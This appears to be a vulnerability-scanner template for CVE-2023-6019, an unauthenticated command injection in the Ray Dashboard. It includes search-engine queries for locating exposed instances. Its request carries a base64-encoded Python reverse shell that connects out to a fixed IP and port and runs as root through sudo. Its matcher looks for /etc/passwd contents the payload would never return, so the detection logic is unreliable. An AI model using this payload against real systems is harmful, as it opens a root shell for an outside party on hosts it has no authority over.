id: CVE-2023-6019

info:
  name: Ray Dashboard Command Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: A command injection vulnerability in Ray's cpu_profile URL parameter allows attackers to execute arbitrary OS commands remotely without authentication.
  impact: |
    Successful exploitation could lead to remote code execution.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-6019
    cwe-id: CWE-78
    epss-score: 0.93509
    epss-percentile: 0.99204
    cpe: cpe:2.3:a:ray_project:ray:-:*:*:*:*:*:*:*
  metadata:
    vendor: ray_project
    product: ray
    shodan-query: http.favicon.hash:463802404
    fofa-query:
      - body="ray dashboard"
      - icon_hash=463802404
      - title="ray dashboard"
    google-query: intitle:"ray dashboard"

http:
  - method: GET
    path:
      - "{{BaseURL}}/worker/cpu_profile?pid=3354&ip={{Hostname}}&duration=5&native=0&format=`echo%20cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMjAwLjE3NyIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkn|base64$IFS-d|sudo%20sh"

    matchers:
      - type: word
        words:
          - "root:x:0:0:root"
        part: body
